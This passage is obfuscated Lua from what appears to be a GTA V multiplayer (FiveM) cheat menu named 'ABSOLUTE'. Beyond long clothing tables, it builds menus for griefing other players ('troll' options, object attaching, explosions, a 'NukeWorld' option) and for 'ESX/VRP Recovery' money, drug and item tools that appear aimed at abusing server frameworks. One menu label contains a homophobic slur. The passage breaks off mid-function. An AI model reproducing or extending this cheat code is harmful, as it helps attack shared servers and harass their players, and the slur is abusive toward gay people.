    143
}
ShirtCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131",
    "132",
    "133",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "140",
    "141",
    "142",
    "143"
}
currShirtIndex = 1
selShirtIndex = 1
ShirtexCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22}
ShirtexCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22"
}
currShirtexIndex = 1
selShirtexIndex = 1
HandsCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131,
    132,
    133,
    134,
    135,
    136,
    137,
    138,
    139,
    140,
    141,
    142,
    143,
    144,
    145,
    146,
    147,
    148,
    149,
    150,
    151,
    152,
    153,
    154,
    155,
    156,
    157,
    158,
    159,
    160,
    161,
    162,
    163,
    164,
    165,
    167
}
HandsCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131",
    "132",
    "133",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "140",
    "141",
    "142",
    "143",
    "144",
    "145",
    "146",
    "147",
    "148",
    "149",
    "150",
    "151",
    "152",
    "153",
    "154",
    "155",
    "156",
    "157",
    "158",
    "159",
    "160",
    "161",
    "162",
    "163",
    "164",
    "165",
    "166",
    "167"
}
currHandsIndex = 1
selHandsIndex = 1
BagCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80
}
BagCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80"
}
currBagIndex = 1
selBagIndex = 1
BagexCB = {0.0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
BagexCBWords = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currBagexIndex = 1
selBagexIndex = 1
BodyArmorCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37
}
BodyArmorCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37"
}
currBodyArmorIndex = 1
selBodyArmorIndex = 1
BodyArmorexCB = {0.0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
BodyArmorexCBWords = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currBodyArmorexIndex = 1
selBodyArmorexIndex = 1
StickersCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67
}
StickersCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67"
}
currStickersIndex = 1
selStickersIndex = 1
StickersexCB = {0.0, 1, 2, 3, 4, 5}
StickersexCBWords = {"0", "1", "2", "3", "4", "5"}
currStickersexIndex = 1
selStickersexIndex = 1
PantsCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114
}
PantsCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114"
}
currPantsIndex = 1
selPantsIndex = 1
PantsexCB = {0.0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
PantsexCBWords = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currPantsexIndex = 1
selPantsexIndex = 1
ShoesCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90
}
ShoesCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90"
}
currShoesIndex = 1
selShoesIndex = 1
ShoesexCB = {0.0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
ShoesexCBWords = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currShoesexIndex = 1
selShoesexIndex = 1
KneckCB = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    35,
    36,
    37,
    38,
    39,
    40,
    41,
    42,
    43,
    44,
    45,
    46,
    47,
    48,
    49,
    50,
    51,
    52,
    53,
    54,
    55,
    56,
    57,
    58,
    59,
    60,
    61,
    62,
    63,
    64,
    65,
    66,
    67,
    68,
    69,
    70,
    71,
    72,
    73,
    74,
    75,
    76,
    77,
    78,
    79,
    80,
    81,
    82,
    83,
    84,
    85,
    86,
    87,
    88,
    89,
    90,
    100,
    101,
    102,
    103,
    104,
    105,
    106,
    107,
    108,
    109,
    110,
    111,
    112,
    113,
    114,
    115,
    116,
    117,
    118,
    119,
    121,
    122,
    123,
    124,
    125,
    126,
    127,
    128,
    129,
    130,
    131
}
KneckCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35",
    "36",
    "37",
    "38",
    "39",
    "40",
    "41",
    "42",
    "43",
    "44",
    "45",
    "46",
    "47",
    "48",
    "49",
    "50",
    "51",
    "52",
    "53",
    "54",
    "55",
    "56",
    "57",
    "58",
    "59",
    "60",
    "61",
    "62",
    "63",
    "64",
    "65",
    "66",
    "67",
    "68",
    "69",
    "70",
    "71",
    "72",
    "73",
    "74",
    "75",
    "76",
    "77",
    "78",
    "79",
    "80",
    "81",
    "82",
    "83",
    "84",
    "85",
    "86",
    "87",
    "88",
    "89",
    "90",
    "100",
    "101",
    "102",
    "103",
    "104",
    "105",
    "106",
    "107",
    "108",
    "109",
    "110",
    "111",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "121",
    "122",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "131"
}
currKneckIndex = 1
selKneckIndex = 1
KneckexCB = {0.0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
KneckexCBWords = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}
currKneckexIndex = 1
selKneckexIndex = 1
ClockCB = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29}
ClockCBWords = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29"
}
currClockIndex = 1
selClockIndex = 1
ClockexCB = {0.0, 1, 2, 3, 4, 5}
ClockexCBWords = {"0", "1", "2", "3", "4", "5"}
currClockexIndex = 1
selClockexIndex = 1
currXmenuPos = 1
selXMenuPos = 1
currYMenuPos = 2
selYMenuPos = 2
menuX = {0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.7}
menuY = {0.025, 0.1, 0.2}
local unmUZzDxZDrD4XocjuI_V = nil
function getPlayerIds()
    local H05uAttPWltOAr = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            H05uAttPWltOAr[#H05uAttPWltOAr + 1] = i
        end
    end
    return H05uAttPWltOAr
end
Citizen.CreateThread(
    function()
        Absolute.CreateMenu("MainMenu", "ABSOLUTE")
        Absolute.SetTitleBackgroundSprite(
            "MainMenu",
            "shopui_title_graphics_franklin",
            "shopui_title_graphics_franklin"
        )
        Citizen.Wait(50)
        Absolute.CreateSubMenu("SelfOptions", "MainMenu", " This are native not ESX or VRP")
        Absolute.CreateSubMenu("Powers", "SelfOptions", "Wow Radiactive habilities")
        Absolute.CreateSubMenu("K9Menu", "SelfOptions", "K-9 Configuration and control")
        Absolute.CreateSubMenu("VelocityPowers", "Powers", "Wow Radiactive habilities")
        Absolute.CreateSubMenu("GmOptions", "Powers", "Awesome")
        Absolute.CreateSubMenu("SuperHeroesPowers", "Powers", "Comics!")
        Absolute.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Options")
        Absolute.CreateSubMenu("ClothingStores", "TeleportMenu", "Clothing Stores")
        Absolute.CreateSubMenu("BarberShops", "TeleportMenu", "Barbery Shops")
        Absolute.CreateSubMenu("Airports", "TeleportMenu", "Airports")
        Absolute.CreateSubMenu("Garages", "TeleportMenu", "Garages and stuff")
        Absolute.CreateSubMenu("Ammunation", "TeleportMenu", "Weapon Shops")
        Absolute.CreateSubMenu("Cinemas", "TeleportMenu", "Cinemas")
        Absolute.CreateSubMenu("VehiclesMenu", "MainMenu", "Vehicle Options")
        Absolute.CreateSubMenu("VehicleSpawner", "VehiclesMenu", "Vehicle Spawner")
        Absolute.CreateSubMenu("CarTypesList", "VehicleSpawner", "Vehicles")
        Absolute.CreateSubMenu("CarTypeSelection", "VehicleSpawner", "Vehicle Types")
        Absolute.CreateSubMenu("VehSpawnOptions", "VehicleSpawner", "Spawner Options")
        Absolute.CreateSubMenu("LSCustoms", "VehiclesMenu", "Los santos customs")
        Absolute.CreateSubMenu("performance", "LSCustoms", " ")
        Absolute.CreateSubMenu("RampsVehicle", "LSCustoms", " ")
        Absolute.CreateSubMenu("AcrobaticsMenu", "LSCustoms", " ")
        Absolute.CreateSubMenu("WardobeMaker", "SelfOptions", "Make your own outfit")
        Absolute.CreateSubMenu("HeadMenu", "WardobeMaker", "Head Variations")
        Absolute.CreateSubMenu("HatMenu", "HeadMenu", "Hats!")
        Absolute.CreateSubMenu("GlassesMenu", "HeadMenu", "Glasses!")
        Absolute.CreateSubMenu("EarMenu", "HeadMenu", "Ear things!")
        Absolute.CreateSubMenu("MaskMenu", "HeadMenu", "Be the mask!")
        Absolute.CreateSubMenu("HairMenu", "HeadMenu", "Haircuts!")
        Absolute.CreateSubMenu("TorsoMaker", "WardobeMaker", "Torso Clothes!")
        Absolute.CreateSubMenu("TorsoMenu", "TorsoMaker", "Torso Clothes!")
        Absolute.CreateSubMenu("TshirtMenu", "TorsoMaker", "Torso Clothes!")
        Absolute.CreateSubMenu("HandsMenu", "TorsoMaker", "Better than csgo gloves!")
        Absolute.CreateSubMenu("BagMenu", "TorsoMaker", "Bags!")
        Absolute.CreateSubMenu("BodyArmorMenu", "TorsoMaker", "Armor!")
        Absolute.CreateSubMenu("StickersMenu", "TorsoMaker", "Stickers!")
        Absolute.CreateSubMenu("LegsMaker", "WardobeMaker", "Legs Clothes!")
        Absolute.CreateSubMenu("LegsMenu", "LegsMaker", "Legs Clothes!")
        Absolute.CreateSubMenu("ShoesMenu", "LegsMaker", "Shoes!")
        Absolute.CreateSubMenu("AccesoriesMaker", "WardobeMaker", "Legs Clothes!")
        Absolute.CreateSubMenu("KneckMenu", "AccesoriesMaker", "Look like Maluma!")
        Absolute.CreateSubMenu("ClockMenu", "AccesoriesMaker", "Rolex")
        Absolute.CreateSubMenu("PlayerList", "MainMenu", "Users: " .. #getPlayerIds())
        Absolute.CreateSubMenu("PlayerOptionsMenu", "PlayerList", " ")
        Absolute.CreateSubMenu("PokemonConfig", "PlayerOptionsMenu", "Pokemon battle!")
        Absolute.CreateSubMenu("PlayerTrollOptions", "PlayerOptionsMenu", "Lets blow up this fag")
        Absolute.CreateSubMenu("TrollObjectAttacher", "PlayerTrollOptions", "Custom Object attacher")
        Absolute.CreateSubMenu("WeaponTypesForSelectedPlayer", "PlayerOptionsMenu", "Weapon Categories")
        Absolute.CreateSubMenu("WeaponTypeSelectionToPlayer", "WeaponTypesForSelectedPlayer", "Weapon")
        Absolute.CreateSubMenu("WeaponOptionsToPlayer", "WeaponTypeSelectionToPlayer", "Weapon Options")
        Absolute.CreateSubMenu("WeaponMenu", "MainMenu", "Ammu-Nation")
        Absolute.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapon Categories")
        Absolute.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon")
        Absolute.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options")
        Absolute.CreateSubMenu("ModSelect", "WeaponOptions", "Weapon Mod Options")
        Absolute.CreateSubMenu("PedGunOptions", "WeaponMenu", "Who dont like peds?")
        Absolute.CreateSubMenu("GTAOShooter", "WeaponMenu", "Weapon changer ez")
        Absolute.CreateSubMenu("CustomExplosions", "WeaponMenu", "Explosion changer")
        Absolute.CreateSubMenu("VisualOptions", "MainMenu", "Visual Options")
        Absolute.CreateSubMenu("ESPOptions", "VisualOptions", "ESP Options")
        Absolute.CreateSubMenu("Recovery", "MainMenu", "Recovery")
        Absolute.CreateSubMenu("ESXRecovery", "Recovery", "USE UNDER YOUR OWN RISK! (UNDER DEV)")
        Absolute.CreateSubMenu("VRPRecovery", "Recovery", "USE UNDER YOUR OWN RISK!")
        Absolute.CreateSubMenu("ServerResourceList", "Recovery", "Server resources")
        Absolute.CreateSubMenu("Jobspanel", "ESXRecovery", "USE UNDER YOUR OWN RISK!")
        Absolute.CreateSubMenu("ESXItems", "ESXRecovery", "USE UNDER YOUR OWN RISK!(UNDER DEV)")
        Absolute.CreateSubMenu("ESXMisc", "ESXRecovery", "USE UNDER YOUR OWN RISK!")
        Absolute.CreateSubMenu("ESXDrugs", "ESXRecovery", "USE UNDER YOUR OWN RISK!")
        Absolute.CreateSubMenu("ESXMoney", "ESXRecovery", "USE UNDER YOUR OWN RISK! (UNDER DEV)")
        Absolute.CreateSubMenu("NukeWorld", "MainMenu", "NUKER")
        Absolute.CreateSubMenu("CraftLaboratory", "MainMenu", "OwO")
        Absolute.CreateSubMenu("VehiclesLaboratory", "CraftLaboratory", "OwO")
        Absolute.CreateSubMenu("MenuSettings", "MainMenu", "Config")
        Absolute.CreateSubMenu("Credits", "MenuSettings", "Credits T.T")
        while Enabled do
            local function czNoOAJOHtKWmsaN9(o8H2ou, Qsu222mh8U, og5Xg)
                SetTextFont(0.0)
                SetTextProportional(1)
                SetTextScale(nlXCUGaxh(0.0), 0.3)
                SetTextDropshadow(1, 0.0, 0.0, 0.0, 255)
                SetTextEdge(1, 0.0, 0.0, 0.0, 255)
                SetTextDropShadow()
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(o8H2ou)
                DrawText(Qsu222mh8U, og5Xg)
            end
            function GetResources()
                local _0jZz0QYHjBxlIHC0xOJ = {}
                for i = 0.0, GetNumResources() do
                    _0jZz0QYHjBxlIHC0xOJ[i] = GetResourceByFindIndex(i)
                end
                return _0jZz0QYHjBxlIHC0xOJ
            end
            local Id1tlEeyGa2CC = {}
            Id1tlEeyGa2CC = GetResources()
            if showCoords then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                czNoOAJOHtKWmsaN9("~o~X:~s~ " .. roundx, 0.05, 0.1)
                czNoOAJOHtKWmsaN9("~o~Y:~s~ " .. roundy, 0.05, 0.115)
                czNoOAJOHtKWmsaN9("~o~Z:~s~ " .. roundz, 0.05, 0.13)
            end
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end
            if IronFist then
                local Wi1b079R, Dmt = GetPedLastWeaponImpactCoord(PlayerPedId())
                if Wi1b079R then
                    msnUPYc5iQSiGfA(Dmt.x, Dmt.y, Dmt.z, 2, nlXCUGaxh(100000), false, true, 0.0)
                    msnUPYc5iQSiGfA(Dmt.x, Dmt.y, Dmt.z, 2, nlXCUGaxh(100000), false, true, 0.0)
                    msnUPYc5iQSiGfA(Dmt.x, Dmt.y, Dmt.z, 2, nlXCUGaxh(100000), false, true, 0.0)
                    msnUPYc5iQSiGfA(Dmt.x, Dmt.y, Dmt.z, 2, nlXCUGaxh(100000), false, true, 0.0)
                    msnUPYc5iQSiGfA(Dmt.x, Dmt.y, Dmt.z, 2, nlXCUGaxh(100000), false, true, 0.0)
                end
            end
            function trim(DpZKlLTPj8i8pij)
                if DpZKlLTPj8i8pij then
                    return (string.gsub(DpZKlLTPj8i8pij, "^%s*(.-)%s*$", "%1"))
                else
                    return nil
                end
            end
            function GetVehicleProperties(GNYTV3XnUFoxdun8mV)
                local qguZRn, GDb1Z0ud5kL = GetVehicleColours(GNYTV3XnUFoxdun8mV)
                local hhCmXXD1_h_ZoB6227Ln, ScRA7BWOXoEADv = GetVehicleExtraColours(GNYTV3XnUFoxdun8mV)
                local uO = {}
                for id = 0.0, 12 do
                    if DoesExtraExist(GNYTV3XnUFoxdun8mV, id) then
                        local wn1Ioy2PN4k = IsVehicleExtraTurnedOn(GNYTV3XnUFoxdun8mV, id) == 1
                        uO[tostring(id)] = wn1Ioy2PN4k
                    end
                end
                return {
                    model = GetEntityModel(GNYTV3XnUFoxdun8mV),
                    plate = trim(GetVehicleNumberPlateText(GNYTV3XnUFoxdun8mV)),
                    plateIndex = GetVehicleNumberPlateTextIndex(GNYTV3XnUFoxdun8mV),
                    health = GetEntityMaxHealth(GNYTV3XnUFoxdun8mV),
                    dirtLevel = GetVehicleDirtLevel(GNYTV3XnUFoxdun8mV),
                    color1 = qguZRn,
                    color2 = GDb1Z0ud5kL,
                    pearlescentColor = hhCmXXD1_h_ZoB6227Ln,
                    wheelColor = ScRA7BWOXoEADv,
                    wheels = GetVehicleWheelType(GNYTV3XnUFoxdun8mV),
                    windowTint = GetVehicleWindowTint(GNYTV3XnUFoxdun8mV),
                    neonEnabled = {
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 0.0),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 1),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 2),
                        IsVehicleNeonLightEnabled(GNYTV3XnUFoxdun8mV, 3)
                    },
                    extras = uO,
                    neonColor = table.pack(GetVehicleNeonLightsColour(GNYTV3XnUFoxdun8mV)),
                    tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(GNYTV3XnUFoxdun8mV)),
                    modSpoilers = GetVehicleMod(GNYTV3XnUFoxdun8mV, 0.0),
                    modFrontBumper = GetVehicleMod(GNYTV3XnUFoxdun8mV, 1),
                    modRearBumper = GetVehicleMod(GNYTV3XnUFoxdun8mV, 2),
                    modSideSkirt = GetVehicleMod(GNYTV3XnUFoxdun8mV, 3),
                    modExhaust = GetVehicleMod(GNYTV3XnUFoxdun8mV, 4),
                    modFrame = GetVehicleMod(GNYTV3XnUFoxdun8mV, 5),
                    modGrille = GetVehicleMod(GNYTV3XnUFoxdun8mV, 6),
                    modHood = GetVehicleMod(GNYTV3XnUFoxdun8mV, 7),
                    modFender = GetVehicleMod(GNYTV3XnUFoxdun8mV, 8),
                    modRightFender = GetVehicleMod(GNYTV3XnUFoxdun8mV, 9),
                    modRoof = GetVehicleMod(GNYTV3XnUFoxdun8mV, 10),
                    modEngine = GetVehicleMod(GNYTV3XnUFoxdun8mV, 11),
                    modBrakes = GetVehicleMod(GNYTV3XnUFoxdun8mV, 12),
                    modTransmission = GetVehicleMod(GNYTV3XnUFoxdun8mV, 13),
                    modHorns = GetVehicleMod(GNYTV3XnUFoxdun8mV, 14),
                    modSuspension = GetVehicleMod(GNYTV3XnUFoxdun8mV, 15),
                    modArmor = GetVehicleMod(GNYTV3XnUFoxdun8mV, 16),
                    modTurbo = IsToggleModOn(GNYTV3XnUFoxdun8mV, 18),
                    modSmokeEnabled = IsToggleModOn(GNYTV3XnUFoxdun8mV, 20),
                    modXenon = IsToggleModOn(GNYTV3XnUFoxdun8mV, 22),
                    modFrontWheels = GetVehicleMod(GNYTV3XnUFoxdun8mV, 23),
                    modBackWheels = GetVehicleMod(GNYTV3XnUFoxdun8mV, 24),
                    modPlateHolder = GetVehicleMod(GNYTV3XnUFoxdun8mV, 25),
                    modVanityPlate = GetVehicleMod(GNYTV3XnUFoxdun8mV, 26),
                    modTrimA = GetVehicleMod(GNYTV3XnUFoxdun8mV, 27),
                    modOrnaments = GetVehicleMod(GNYTV3XnUFoxdun8mV, 28),
                    modDashboard = GetVehicleMod(GNYTV3XnUFoxdun8mV, 29),
                    modDial = GetVehicleMod(GNYTV3XnUFoxdun8mV, 30),
                    modDoorSpeaker = GetVehicleMod(GNYTV3XnUFoxdun8mV, 31),
                    modSeats = GetVehicleMod(GNYTV3XnUFoxdun8mV, 32),
                    modSteeringWheel = GetVehicleMod(GNYTV3XnUFoxdun8mV, 33),
